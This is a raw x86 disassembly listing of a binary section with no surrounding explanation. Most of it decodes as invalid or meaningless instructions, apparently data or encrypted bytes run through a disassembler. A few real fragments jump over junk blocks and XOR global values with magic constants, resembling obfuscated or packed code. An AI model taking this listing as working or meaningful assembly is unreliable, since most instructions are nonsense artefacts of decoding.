  4077dc:	lods   eax,DWORD PTR ds:[esi]
  4077dd:	neg    BYTE PTR [ebx+edx*8+0x7c05243a]
  4077e4:	xor    al,ah
  4077e6:	jne    0x4077ed
  4077e8:	enter  0xf8a2,0x22
  4077ec:	mov    ecx,0xc2369586
  4077f1:	outs   dx,BYTE PTR ds:[esi]
  4077f2:	mov    al,0x17
  4077f4:	sub    BYTE PTR [ebx-0x5966f321],dh
  4077fa:	dec    eax
  4077fb:	test   BYTE PTR [ecx+0x15c83efb],cl
  407801:	jno    0x40781e
  407803:	pop    esp
  407804:	mov    ch,dl
  407806:	sbb    ecx,DWORD PTR [edx-0x6dd49d7]
  40780c:	out    dx,eax
  40780d:	into   
  40780e:	out    0x8b,eax
  407810:	ret    0x56cb
  407813:	adc    eax,0xd2a0dd02
  407818:	cwde   
  407819:	fdiv   st,st(4)
  40781b:	mov    al,0xce
  40781d:	push   esi
  40781e:	sbb    al,0x45
  407820:	push   esp
  407821:	mov    esp,0x215bd444
  407826:	jg     0x4077b7
  407828:	test   BYTE PTR [edi-0x53ca1521],al
  40782e:	add    DWORD PTR [esi+0x5a],0x2c
  407832:	or     edx,ecx
  407834:	dec    edx
  407835:	lea    edi,[esi+0x77]
  407838:	in     eax,dx
  407839:	pop    edi
  40783a:	sbb    al,dh
  40783c:	aam    0x17
  40783e:	jp     0x40788d
  407840:	pop    ecx
  407841:	(bad)  
  407842:	daa    
  407843:	call   0x728:0xe59c67a9
  40784a:	push   eax
  40784b:	mov    ah,0x1e
  40784d:	in     eax,0xd7
  40784f:	xchg   DWORD PTR [ecx+ecx*1-0x7a0dfa4b],ebp
  407856:	fcmovbe st,st(1)
  407858:	pop    ecx
  407859:	addr16 sbb al,0xa0
  40785c:	ret    0xe3d
  40785f:	aam    0xfc
  407861:	into   
  407862:	xchg   edi,eax
  407863:	pop    edi
  407864:	shl    dl,cl
  407866:	loop   0x407805
  407868:	xchg   edx,eax
  407869:	retf   0x7524
  40786c:	push   esi
  40786d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40786e:	jns    0x4078b3
  407870:	retf   
  407871:	sub    esi,esp
  407873:	js     0x407839
  407875:	mov    edi,0xed108f66
  40787a:	inc    ebx
  40787b:	repnz mov ds:0xf37bb7a6,eax
  407881:	mov    BYTE PTR [ebx],cl
  407883:	daa    
  407884:	adc    al,0xbf
  407886:	xor    BYTE PTR [edx],cl
  407888:	ret    
  407889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40788a:	iret   
  40788b:	mov    ds:0x6db5df19,al
  407890:	sub    eax,0xd938f80d
  407895:	mov    ah,0x19
  407897:	les    edx,FWORD PTR [ebx]
  407899:	fcom   QWORD PTR [ebx]
  40789b:	std    
  40789c:	cli    
  40789d:	jl     0x4078a2
  40789f:	in     eax,0x31
  4078a1:	retf   
  4078a2:	(bad)  
  4078a3:	out    dx,eax
  4078a4:	mov    WORD PTR [ebx+0x49],cs
  4078a7:	aad    0xd6
  4078a9:	inc    ebx
  4078aa:	mov    bh,0x55
  4078ac:	jp     0x4078d2
  4078ae:	mov    eax,0x4406b8f4
  4078b3:	xor    edx,0xfb8a2afa
  4078b9:	cmp    BYTE PTR [edi-0x266bee50],dl
  4078bf:	add    BYTE PTR [ecx],dh
  4078c1:	clc    
  4078c2:	jmp    0x407919
  4078c4:	adc    eax,0x7671a610
  4078c9:	ins    DWORD PTR es:[edi],dx
  4078ca:	sbb    ah,BYTE PTR [edx+0x9]
  4078cd:	mov    al,ds:0xb200707b
  4078d2:	cs gs cli 
  4078d5:	fld    DWORD PTR [edx-0x6f]
  4078d8:	pop    edi
  4078d9:	fwait
  4078da:	xor    ch,BYTE PTR [ebx+0x53]
  4078dd:	mov    esi,0xe7ac30f4
  4078e2:	inc    ebp
  4078e3:	xchg   ebp,eax
  4078e4:	jge    0x40790a
  4078e6:	call   DWORD PTR [ebx]
  4078e8:	push   0x56
  4078ea:	(bad)  
  4078eb:	(bad)  [esi+esi*4-0x2b2487ba]
  4078f2:	jg     0x40793e
  4078f4:	sbb    eax,0x5a88b727
  4078f9:	add    eax,0xc0b70fc6
  4078fe:	or     eax,ecx
  407900:	cdq    
  407901:	pop    ecx
  407902:	idiv   ecx
  407904:	mov    cx,WORD PTR [ebp-0x14]
  407908:	cmp    cx,ax
  40790b:	jb     0x4084d1
  407911:	movzx  eax,BYTE PTR ds:0x422706
  407918:	mov    cl,0x5
  40791a:	imul   cl
  40791c:	and    eax,0x28
  40791f:	or     al,0x56
  407921:	mov    BYTE PTR [ebp-0x1],al
  407924:	mov    eax,ds:0x422768
  407929:	cmp    eax,0x7cd80819
  40792e:	jne    0x4084d1
  407934:	mov    eax,DWORD PTR [ebp-0x28]
  407937:	mov    ecx,DWORD PTR [ebp-0x24]
  40793a:	shrd   eax,ecx,0x2
  40793e:	shr    ecx,0x2
  407941:	mov    ecx,DWORD PTR [ebp-0x28]
  407944:	jmp    0x407bdd
  407949:	in     eax,0xf
  40794b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40794c:	push   edi
  40794d:	mov    ch,0x7d
  40794f:	cmp    eax,0xde8c14bd
  407954:	sti    
  407955:	retf   
  407956:	jmp    0xbbbb:0x46190577
  40795d:	stos   BYTE PTR es:[edi],al
  40795e:	mov    edi,0xabd2bbbb
  407963:	mov    dl,0x10
  407965:	sbb    DWORD PTR [ecx],esp
  407967:	push   esi
  407968:	sub    eax,0x795c3fc2
  40796d:	mov    ds,WORD PTR [esi]
  40796f:	outs   dx,BYTE PTR ds:[esi]
  407970:	(bad)  
  407971:	mov    ecx,0x27be4bf2
  407976:	call   0x5f68431c
  40797b:	mov    ds:0xe54c71f6,al
  407980:	imul   esp,DWORD PTR [edx+0x3fb4ba32],0x66
  407987:	push   cs
  407988:	in     eax,0xb9
  40798a:	shl    BYTE PTR [ebp-0x1d],1
  40798d:	or     al,0x6a
  40798f:	inc    ecx
  407990:	rcl    DWORD PTR [ecx+edi*2],1
  407993:	popa   
  407994:	mov    eax,0xa7e22122
  407999:	xlat   BYTE PTR ds:[ebx]
  40799a:	jmp    0x1d52d20b
  40799f:	xchg   ebp,eax
  4079a0:	sub    DWORD PTR ds:0xd798578,eax
  4079a6:	push   cs
  4079a7:	(bad)
  4079aa:	lea    ebp,[edx-0x1594a275]
  4079b0:	daa    
  4079b1:	es jno 0x407951
  4079b4:	mov    DWORD PTR ds:[edi-0x17d8a07b],eax
  4079bb:	in     eax,dx
  4079bc:	mov    ds:0xe172eee8,al
  4079c1:	sub    DWORD PTR [edi+0x2c],ecx
  4079c4:	call   0x811d1cbd
  4079c9:	cli    
  4079ca:	pop    esi
  4079cb:	sbb    dh,BYTE PTR [ecx]
  4079cd:	and    dl,BYTE PTR [ebx]
  4079cf:	test   edx,ebp
  4079d1:	sub    ebp,esp
  4079d3:	outs   dx,DWORD PTR ds:[esi]
  4079d4:	popa   
  4079d5:	(bad)  
  4079d6:	addr16 adc eax,0x3c3e8dd3
  4079dc:	fiadd  WORD PTR [eax*8+0x5fc2892d]
  4079e3:	outs   dx,BYTE PTR ds:[esi]
  4079e4:	pop    ss
  4079e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079e6:	hlt    
  4079e7:	sbb    esi,DWORD PTR [ecx-0x67]
  4079ea:	mov    dh,0x4a
  4079ec:	sbb    BYTE PTR fs:[ebx+0x2cc48df7],ch
  4079f3:	and    eax,DWORD PTR [ecx+eax*4-0x32]
  4079f7:	sub    al,0xfe
  4079f9:	cmp    DWORD PTR [ebp+0x7a],esi
  4079fc:	sbb    eax,0x36681ebe
  407a01:	call   eax
  407a03:	xchg   DWORD PTR [edi+0x2e],ebp
  407a06:	push   cs
  407a07:	or     eax,0x86000393
  407a0c:	out    dx,eax
  407a0d:	mov    ebp,DWORD PTR [edi]
  407a0f:	mov    ch,0x21
  407a11:	mov    dl,0xbf
  407a13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a14:	aaa    
  407a15:	mov    al,cl
  407a17:	leave  
  407a18:	fucomi st,st(5)
  407a1a:	xchg   ebx,eax
  407a1b:	mov    esi,0xd01cb53f
  407a20:	mov    esp,0x74e02348
  407a25:	rol    BYTE PTR [edi+ecx*4],0x3f
  407a29:	dec    ebx
  407a2a:	out    0xa7,al
  407a2c:	fimul  DWORD PTR [ebx+0x342651aa]
  407a32:	in     al,0xb0
  407a34:	pop    es
  407a35:	mov    ebx,0xdca85aad
  407a3a:	daa    
  407a3b:	add    bl,0x78
  407a3e:	or     dl,bh
  407a40:	scas   al,BYTE PTR es:[edi]
  407a41:	ficom  DWORD PTR [ecx+ebx*8-0x5b668abe]
  407a48:	out    0x86,eax
  407a4a:	sub    esp,DWORD PTR [edx-0x7c00465a]
  407a50:	ins    DWORD PTR es:[edi],dx
  407a51:	aas    
  407a52:	fs (bad) 
  407a54:	imul   edi,DWORD PTR [ecx+0x72e3c0eb],0xc8230e3e
  407a5e:	sub    ebx,DWORD PTR [ebp+0x76]
  407a61:	dec    esi
  407a62:	ror    DWORD PTR [edi-0x47],cl
  407a65:	add    edi,esi
  407a67:	mov    BYTE PTR [edi+ecx*4],dh
  407a6a:	stos   BYTE PTR es:[edi],al
  407a6b:	push   eax
  407a6c:	(bad)  
  407a6d:	xchg   ecx,eax
  407a6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a6f:	cmp    DWORD PTR [edx+0x1d],0xbe56bbf6
  407a76:	mov    edi,0x37d25251
  407a7b:	mov    esi,0xd2ff0cbe
  407a80:	mov    ch,ch
  407a82:	push   edi
  407a83:	call   DWORD PTR [edi-0x6a142520]
  407a89:	idiv   DWORD PTR [eax]
  407a8b:	mov    ebp,0xef075870
  407a90:	adc    DWORD PTR [edx-0x380f0a40],0x831c9441
  407a9a:	add    BYTE PTR [edx],cl
  407a9c:	call   0x1051a931
  407aa1:	xchg   ebp,eax
  407aa2:	sbb    eax,0x6ec5ebee
  407aa7:	ret    
  407aa8:	lods   eax,DWORD PTR ds:[esi]
  407aa9:	neg    ebx
  407aab:	hlt    
  407aac:	xor    DWORD PTR [edx*4-0x4f4a1b3a],edx
  407ab3:	cmp    cl,BYTE PTR [ebx+0x664b617e]
  407ab9:	dec    edi
  407aba:	aam    0xe2
  407abc:	gs stos DWORD PTR es:[edi],eax
  407abe:	jmp    0x407b13
  407ac0:	xlat   BYTE PTR ds:[ebx]
  407ac1:	fisubr DWORD PTR [edx]
  407ac3:	fistp  QWORD PTR [ebp-0x1c55968e]
  407ac9:	outs   dx,DWORD PTR ds:[esi]
  407aca:	push   ds
  407acb:	iret   
  407acc:	mov    cl,0xf3
  407ace:	dec    esp
  407acf:	pusha  
  407ad0:	jae    0x407ad6
  407ad2:	dec    edi
  407ad3:	and    al,0xc5
  407ad5:	xor    edi,ebp
  407ad7:	jbe    0x407b3f
  407ad9:	inc    eax
  407ada:	sub    eax,0xf490e800
  407adf:	cwde   
  407ae0:	out    0x3a,al
  407ae2:	sub    DWORD PTR [esi],ebp
  407ae4:	ins    DWORD PTR es:[edi],dx
  407ae5:	cmp    eax,0xebfe4d7d
  407aea:	xor    al,0x79
  407aec:	imul   ecx,DWORD PTR [edi-0x13],0xb
  407af0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407af1:	or     DWORD PTR [esi],esi
  407af3:	out    0xde,eax
  407af5:	sub    ebp,DWORD PTR [eax-0x208dbfb6]
  407afb:	shl    ch,cl
  407afd:	mov    bl,0x9b
  407aff:	lock sbb dl,ah
  407b02:	add    eax,0x7559fc81
  407b07:	cli    
  407b08:	mov    BYTE PTR [esi+0x5c],dl
  407b0b:	scas   al,BYTE PTR es:[edi]
  407b0c:	sub    al,0x71
  407b0e:	mov    bh,0xe8
  407b10:	div    esi
  407b12:	push   esp
  407b13:	(bad)  
  407b14:	scas   al,BYTE PTR es:[edi]
  407b15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b17:	fisttp DWORD PTR [esp+edx*1+0x4e0b5e98]
  407b1e:	xchg   edx,eax
  407b1f:	retf   0x3e02
  407b22:	xchg   edx,eax
  407b23:	sbb    dl,0x86
  407b26:	mov    ebp,0x781f7838
  407b2b:	push   esi
  407b2c:	div    BYTE PTR [esi]
  407b2e:	xor    edx,DWORD PTR [esi-0x40]
  407b31:	in     al,0x86
  407b33:	dec    eax
  407b34:	fbld   TBYTE PTR [ebx+0x25]
  407b37:	mov    DWORD PTR [edi-0x7d],edi
  407b3a:	inc    ebp
  407b3b:	fs pop ds
  407b3d:	fistp  QWORD PTR [edi+eiz*8]
  407b40:	jo     0x407b7e
  407b42:	(bad)  
  407b44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b45:	jecxz  0x407b8d
  407b47:	icebp  
  407b48:	std    
  407b49:	adc    DWORD PTR [ebx+eax*2+0x19],esi
  407b4d:	daa    
  407b4e:	inc    esi
  407b4f:	push   edx
  407b50:	scas   al,BYTE PTR es:[edi]
  407b51:	leave  
  407b52:	mov    ch,0x59
  407b54:	sub    BYTE PTR [ebp+0x5bff029b],0x64
  407b5b:	and    ebx,edx
  407b5d:	fsub   st,st(7)
  407b5f:	je     0x407b0d
  407b61:	xchg   esp,eax
  407b62:	int    0xc
  407b64:	pop    esi
  407b65:	inc    edi
  407b66:	mov    esp,0xb76a223c
  407b6b:	xor    DWORD PTR [ebx+ecx*4+0x5a686eb1],eax
  407b72:	fs xchg edi,eax
  407b74:	out    0x3,eax
  407b76:	xor    DWORD PTR [edx+0x56],0xffffff8f
  407b7a:	aas    
  407b7b:	xchg   esi,eax
  407b7c:	xchg   edi,eax
  407b7d:	mov    esp,0xb62f2ebb
  407b83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b84:	sbb    edx,edi
  407b86:	(bad)  
  407b87:	xchg   esp,eax
  407b88:	sbb    BYTE PTR ds:0xdb2d372b,bl
  407b8e:	outs   dx,BYTE PTR ds:[esi]
  407b8f:	js     0x407b2e
  407b91:	add    al,0xfe
  407b93:	mov    cl,0x70
  407b95:	cmc    
  407b96:	cmp    BYTE PTR [ecx+0x1bf73842],0xcc
  407b9d:	mov    al,ds:0xb9d3c471
  407ba2:	push   eax
  407ba3:	in     al,dx
  407ba4:	aam    0xca
  407ba6:	mov    ebp,0xac42ee4a
  407bab:	sub    al,bl
  407bad:	mov    eax,ds:0xc094fc00
  407bb2:	jb     0x407c02
  407bb4:	mov    ?,WORD PTR [ebp-0x9]
  407bb7:	cmp    al,0x6e
  407bb9:	adc    eax,0xb4963252
  407bbe:	movhps QWORD PTR [eax+0x3bc2ce48],xmm5
  407bc5:	adc    bl,BYTE PTR ds:0x1ecf6adf
  407bcb:	test   eax,0x7570eec1
  407bd0:	mov    bl,BYTE PTR [esi]
  407bd2:	mov    dh,0x2c
  407bd4:	and    ch,bh
  407bd6:	addr16 mov ebp,0xa55e3ced
  407bdc:	xchg   BYTE PTR [ebx-0x1e3e23ab],cl
  407be2:	push   ds
  407be3:	mov    ecx,DWORD PTR ds:0x4222a8
  407be9:	mov    ecx,DWORD PTR [ecx+0x1a8]
  407bef:	xor    edx,edx
  407bf1:	mov    edi,0x32e26d9d
  407bf6:	xor    eax,edi
  407bf8:	or     eax,edx
  407bfa:	mov    DWORD PTR [ecx],eax
  407bfc:	mov    eax,DWORD PTR [ebp-0x28]
  407bff:	mov    ecx,DWORD PTR [ebp-0x24]
  407c02:	shrd   eax,ecx,0x2
  407c06:	jmp    0x407e9f
  407c0b:	push   ebp
  407c0c:	arpl   WORD PTR [ebp+esi*4-0x5c824a44],cx
  407c13:	sbb    BYTE PTR [edx-0x46],dh
  407c16:	cmp    esp,DWORD PTR [esi+0x82f8391]
  407c1c:	push   eax
  407c1d:	mov    ebx,0xbbbfaabb
  407c22:	mov    ebx,0x58e838a2
  407c27:	sahf   
  407c28:	int3   
  407c29:	div    bl
  407c2b:	mov    ds:0x9e2b2dbf,al
  407c30:	xchg   ebx,eax
  407c31:	sub    eax,0x78d3c9d6
  407c36:	and    eax,0xb6a2e6f7
  407c3b:	add    al,0x40
  407c3d:	push   esp
  407c3e:	aam    0xbb
  407c40:	mov    esi,0x9aab5bc0
  407c45:	mov    edi,0x337a790f
  407c4a:	inc    ebx
  407c4b:	inc    edx
  407c4c:	aaa    
  407c4d:	sub    ch,BYTE PTR [eax-0x43]
  407c50:	loop   0x407ca1
  407c52:	push   es
  407c53:	sbb    DWORD PTR [edi],edi
  407c55:	les    esi,FWORD PTR [edi+0x657dac56]
  407c5b:	adc    ah,0x67
  407c5e:	inc    edx
  407c5f:	add    ch,ah
  407c61:	icebp  
  407c62:	addr16 loop 0x407c8f
  407c65:	adc    DWORD PTR [esi+0x43],esi
  407c68:	jno    0x407cc0
  407c6a:	(bad)  
  407c6b:	in     eax,dx
  407c6c:	cli    
  407c6d:	jno    0x407c0d
  407c6f:	mov    WORD PTR [ebp-0x53],?
  407c72:	(bad)  
  407c74:	xchg   ebp,eax
  407c75:	mov    al,ds:0xb91586be
  407c7a:	or     DWORD PTR [ecx-0x16],edi
  407c7d:	adc    edx,ebx
  407c7f:	into   
  407c80:	xchg   ebx,eax
  407c81:	mov    ebx,DWORD PTR ds:0x302205e4
  407c87:	add    eax,edx
  407c89:	jo     0x407c37
  407c8b:	dec    edi
  407c8c:	pop    ss
  407c8d:	(bad)  
  407c8e:	or     edi,DWORD PTR [ebx]
  407c90:	push   edx
  407c91:	and    edi,DWORD PTR [edi+0xc286734]
  407c97:	in     eax,0x7a
  407c99:	jbe    0x407c7a
  407c9b:	sbb    al,0xc
  407c9d:	jo     0x407c6e
  407c9f:	out    dx,eax
  407ca0:	adc    bh,0x5d
  407ca3:	sbb    DWORD PTR [edx],ebp
  407ca5:	cmp    al,0x56
  407ca7:	and    DWORD PTR [edi-0x41],ecx
  407caa:	sub    eax,0x91d5f434
  407cb0:	sbb    al,ch
  407cb2:	shl    BYTE PTR [ecx-0x23193945],0x2f
  407cb9:	rcr    BYTE PTR [esi-0x2a4be59d],0xf5
  407cc0:	cdq    
  407cc1:	inc    ecx
  407cc2:	sbb    DWORD PTR [ebp+0x75],esp
  407cc5:	xchg   DWORD PTR [edi-0x1fb473ac],edi
  407ccb:	push   es
  407ccc:	mov    edi,0xa050f5d2
  407cd1:	jne    0x407caa
  407cd3:	or     eax,0x5aef595c
  407cd8:	add    ah,cl
  407cda:	aam    0xd0
  407cdc:	mov    eax,0x8f1ceb58
  407ce1:	mov    ds:0x44154016,al
  407ce6:	mov    esp,0xa63b8ed9
  407ceb:	bound  edx,QWORD PTR [edi-0x1eaff0d5]
  407cf1:	aam    0x7e
  407cf3:	and    esp,esp
  407cf5:	pop    eax
  407cf6:	and    BYTE PTR [edx+0x78],bh
  407cf9:	adc    cl,BYTE PTR [edx+0x1720b8c]
  407cff:	cs loopne 0x407d79
  407d02:	(bad)  [esi-0xd80d402]
  407d08:	mov    edi,fs
  407d0a:	mov    BYTE PTR [edi+0x400fe49d],dl
  407d10:	sub    dl,BYTE PTR [ebp-0x7a]
  407d13:	and    eax,0xe07e2629
  407d18:	hlt    
  407d19:	push   eax
  407d1a:	(bad)  
  407d1c:	fsubr  DWORD PTR [edx+0x6a]
  407d1f:	pop    esi
  407d20:	sub    eax,0xd9d8486c
  407d25:	push   eax
  407d26:	jg     0x407ce6
  407d28:	aaa    
  407d29:	adc    BYTE PTR [ebp+0x5b],dl
  407d2c:	adc    al,0x7b
  407d2e:	inc    edi
  407d2f:	jns    0x407d10
  407d31:	dec    ebx
  407d32:	sbb    BYTE PTR [eax],ch
  407d34:	das    
  407d35:	add    eax,0x1ae97073
  407d3a:	outs   dx,BYTE PTR ds:[esi]
  407d3b:	or     dl,BYTE PTR [eax-0x66cb09a9]
  407d41:	hlt    
  407d42:	inc    esi
  407d43:	ret    0xede7
  407d46:	xor    DWORD PTR [edx+0x58e3e35f],eax
  407d4c:	mov    eax,ds:0xc530b5d1
  407d51:	push   cs
  407d52:	dec    ebp
  407d53:	loop   0x407daa
  407d55:	sahf   
  407d56:	mov    es,WORD PTR [ecx+0x36]
  407d59:	add    ebp,DWORD PTR [ebx-0x2d539dc6]
  407d5f:	cmc    
  407d60:	repz sahf 
  407d62:	and    ebp,0x8fec5a1f
  407d68:	jb     0x407dc8
  407d6a:	leave  
  407d6b:	ja     0x407d02
  407d6d:	loopne 0x407d92
  407d6f:	jecxz  0x407deb
  407d71:	clc    
  407d72:	push   cs
  407d73:	sbb    al,0x95
  407d75:	add    eax,DWORD PTR [ebx-0x2d]
  407d78:	or     ah,BYTE PTR [eax-0x5cc56d60]
  407d7e:	cmp    ecx,DWORD PTR [ecx-0x30]
  407d81:	add    al,0x81
  407d83:	shl    DWORD PTR [edi-0x42],1
  407d86:	int    0x93
  407d88:	sbb    eax,0xec3b69ef
  407d8d:	push   edx
  407d8e:	call   DWORD PTR [edi]
  407d90:	idiv   DWORD PTR [edx+0x75a1eb09]
  407d96:	sub    eax,0x1e650137
  407d9b:	inc    ecx
  407d9c:	outs   dx,DWORD PTR fs:[esi]
  407d9e:	xchg   DWORD PTR [edi+eax*8-0x4d84f1f5],esi
  407da5:	mov    al,0x56
  407da7:	clc    
  407da8:	test   eax,0xfb87c38a
  407dad:	stos   BYTE PTR es:[edi],al
  407dae:	jae    0x407e2d
  407db0:	frstor ds:0x2a028843
  407db6:	loope  0x407db8
  407db8:	ret    
  407db9:	push   ss
  407dba:	nop
  407dbb:	mov    ah,0xda
  407dbd:	(bad)  
  407dbe:	into   
  407dbf:	push   esi
  407dc0:	arpl   WORD PTR [edx+ebx*8+0x79],bp
  407dc4:	mov    eax,ds:0xd4326572
  407dc9:	jg     0x407e31
  407dcb:	rcl    DWORD PTR [esi-0x65],cl
  407dce:	xlat   BYTE PTR ds:[ebx]
  407dcf:	bound  ebx,QWORD PTR [ebx-0xb]
  407dd2:	arpl   bp,bx
  407dd4:	mov    eax,ds
  407dd6:	add    BYTE PTR [edx],0x32
  407dd9:	inc    ecx
  407dda:	push   ebp
  407ddb:	push   esi
  407ddc:	or     al,0x44
  407dde:	faddp  st(0),st
  407de0:	pop    esp
  407de1:	stos   BYTE PTR es:[edi],al
  407de2:	cmp    DWORD PTR [ebx+0x7d],0xa10a742d
  407de9:	xchg   esi,esp
  407deb:	xlat   BYTE PTR ds:[ebx]
  407dec:	mov    al,0x24
  407dee:	ret    0xe5ff
  407df1:	lock sub al,0x8c
  407df4:	call   0x8be5:0x7202c98d
  407dfb:	shl    esp,1
  407dfd:	(bad)  
  407dfe:	ja     0x407e5f
  407e00:	into   
  407e01:	push   cs
  407e02:	fstp   QWORD PTR [edx-0x4c]
  407e05:	mov    bh,0xd9
  407e07:	sbb    bh,BYTE PTR [eax-0x22b7a49e]
  407e0d:	loop   0x407df7
  407e0f:	repnz and esp,esi
  407e12:	in     al,0x25
  407e14:	(bad)  
  407e15:	pandn  mm7,QWORD PTR [eax]
  407e18:	je     0x407e43
  407e1a:	push   edx
  407e1b:	xchg   edx,eax
  407e1c:	arpl   WORD PTR [edi-0x36],ax
  407e1f:	cmp    ah,BYTE PTR ss:0xa9c81235
  407e26:	scas   al,BYTE PTR es:[edi]
  407e27:	xchg   esi,eax
  407e28:	cld    
  407e29:	lods   eax,DWORD PTR cs:[esi]
  407e2b:	fcmovbe st,st(1)
  407e2d:	lock xor ch,BYTE PTR [edx-0x47a3c5a2]
  407e34:	sbb    al,0x9f
  407e36:	cmp    ebp,DWORD PTR [eax+eiz*4]
  407e39:	in     al,0x95
  407e3b:	jl     0x407e0e
  407e3d:	mov    esp,0x94dc4e07
  407e42:	jge    0x407dcd
  407e44:	std    
  407e45:	les    ebx,FWORD PTR [eiz*2+0x40c8117]
  407e4c:	loop   0x407e29
  407e4e:	sti    
  407e4f:	xchg   esp,eax
  407e50:	je     0x407e98
  407e52:	shr    DWORD PTR [eax-0x3d],1
  407e55:	xchg   esp,eax
  407e56:	and    edx,DWORD PTR [eax]
  407e58:	cmp    ecx,DWORD PTR gs:[esi]
  407e5b:	sbb    ebp,DWORD PTR [edi+0x335dcef]
  407e61:	inc    esi
  407e62:	std    
  407e63:	aaa    
  407e64:	dec    ebp
  407e65:	in     al,0x3b
  407e67:	sbb    al,BYTE PTR [eax+0x34]
  407e6a:	or     BYTE PTR [eax],bh
  407e6c:	dec    esp
  407e6d:	dec    esp
  407e6e:	aam    0x90
  407e70:	or     ecx,edi
  407e72:	dec    eax
  407e73:	jge    0x407e82
  407e75:	push   0xd18fd3f2
  407e7a:	dec    ecx
  407e7b:	inc    esi
  407e7c:	pop    ebx
  407e7d:	ret    
  407e7e:	inc    edi
  407e7f:	adc    edx,DWORD PTR [ebp+0x17c1f706]
  407e85:	add    eax,0x37a3dd72
  407e8a:	test   BYTE PTR [ecx+edx*4-0x5b74c11],dl
  407e91:	push   es
  407e92:	je     0x407e79
  407e94:	jp     0x407e7e
  407e96:	ds pop es
  407e98:	sbb    bh,BYTE PTR [ebp-0x22]
  407e9b:	ins    BYTE PTR es:[edi],dx
  407e9c:	leave  
  407e9d:	inc    edi
  407e9e:	cmc    
  407e9f:	shr    ecx,0x2
  407ea2:	mov    ecx,DWORD PTR [ebp-0x28]
  407ea5:	mov    edx,DWORD PTR [ebp-0x24]
  407ea8:	xor    eax,edi
  407eaa:	xor    edx,edx
  407eac:	or     eax,edx
  407eae:	mov    ds:0x422768,eax
  407eb3:	mov    DWORD PTR [ebp-0x20],0x1967
  407eba:	mov    DWORD PTR [ebp-0x1c],0x667f
  407ec1:	mov    eax,ds:0x422708
  407ec6:	shl    ecx,0x1e
  407ec9:	mov    ecx,DWORD PTR ds:0x42270c
  407ecf:	mov    edx,0x3b72
  407ed4:	sub    edx,eax
  407ed6:	jmp    0x40816f
  407edb:	gs inc eax
  407edd:	pop    ebx
  407ede:	mov    ah,0x5f
  407ee0:	mov    ch,0xb5
  407ee2:	xchg   ecx,eax
  407ee3:	inc    edi
  407ee4:	into   
  407ee5:	jno    0x407f58
  407ee7:	inc    ebx
  407ee8:	loopne 0x407f05
  407eea:	xor    ecx,edi
  407eec:	push   esp
  407eed:	mov    ebx,0xbbbfaabb
  407ef2:	mov    ebx,0x3a437d33
  407ef7:	and    dl,dl
  407ef9:	jo     0x407ef1
  407efb:	or     dl,BYTE PTR [eax+0x4f]
  407efe:	sbb    eax,0x5d15f8f3
  407f03:	pop    ds
  407f04:	sbb    ecx,DWORD PTR [edx+0x9]
  407f07:	test   DWORD PTR [eax],eax
  407f09:	daa    
  407f0a:	jmp    0x17c6:0xb5293c70
  407f11:	add    esi,DWORD PTR [esi]
  407f13:	out    0xae,eax
  407f15:	iret   
  407f16:	cmp    DWORD PTR [ebp+0x5],eax
  407f19:	add    bl,BYTE PTR [ecx+0x1d75b158]
  407f1f:	pop    ecx
  407f20:	les    ebx,FWORD PTR [edx+0x466273e8]
  407f26:	rcr    BYTE PTR [ebx-0x41384ef4],cl
  407f2c:	jge    0x407f86
  407f2e:	push   ecx
  407f2f:	mov    eax,0xc90622b8
  407f34:	sbb    BYTE PTR [edx+esi*4-0x11],0x7c
  407f39:	push   esi
  407f3a:	outs   dx,DWORD PTR ds:[esi]
  407f3b:	imul   esp,eax,0x15
  407f3e:	test   DWORD PTR [edi+esi*2+0x720f1001],ebx
  407f45:	js     0x407f76
  407f47:	lock bound edi,QWORD PTR [eax]
  407f4a:	sbb    eax,0x915e9729
  407f4f:	and    dl,BYTE PTR [edx+0x4a]
  407f52:	ds adc al,0xe9
  407f55:	pusha  
  407f56:	ret    0x83db
  407f59:	jmp    0x407f7f
  407f5b:	ret    0xf81d
  407f5e:	ins    BYTE PTR es:[edi],dx
  407f5f:	cmp    al,0xfe
  407f61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f62:	jnp    0x407f84
  407f64:	bswap  esi
  407f66:	sub    eax,0x1b59ce6d
  407f6b:	aaa    
  407f6c:	mov    ch,0x0
  407f6e:	shl    DWORD PTR [ecx-0x75],0x96
  407f72:	and    ecx,DWORD PTR [ecx-0x18f55c9]
  407f78:	aaa    
  407f79:	jnp    0x407f46
  407f7b:	in     eax,dx
  407f7c:	imul   ecx,ebp,0x14
  407f7f:	fmul   QWORD PTR [ebp-0x24fed487]
  407f85:	xchg   ecx,eax
  407f86:	xchg   ecx,eax
  407f87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f88:	jmp    0x407f5e
  407f8a:	push   ds
  407f8b:	es xor al,0xba
  407f8e:	mov    eax,DWORD PTR [eax-0x11ed3353]
  407f94:	hlt    
  407f95:	dec    eax
  407f96:	sbb    ebp,edx
  407f98:	aam    0x34
  407f9a:	shl    DWORD PTR [ecx-0x2b],0x13
  407f9e:	mov    bl,0xb
  407fa0:	inc    ebx
  407fa1:	(bad)  
  407fa2:	or     BYTE PTR [esp+eiz*4+0xeacf676],dh
  407fa9:	fist   DWORD PTR [ecx+0x28b5f194]
  407faf:	sub    DWORD PTR [ecx+eiz*2+0x1e],eax
  407fb3:	jae    0x408029
  407fb5:	outs   dx,BYTE PTR ds:[esi]
  407fb6:	push   eax
  407fb7:	lods   al,BYTE PTR ds:[esi]
  407fb8:	adc    bl,BYTE PTR [ebx-0x4c6e08ee]
  407fbe:	icebp  
  407fbf:	mov    ebx,0x250d2151
  407fc4:	inc    esp
  407fc5:	inc    ecx
  407fc6:	aas    
  407fc7:	sbb    edx,DWORD PTR [esi+0x5168033f]
  407fcd:	fcomp  QWORD PTR [ecx+edx*8+0x71]
  407fd1:	or     al,al
  407fd3:	shl    DWORD PTR [edx],cl
  407fd5:	jbe    0x408016
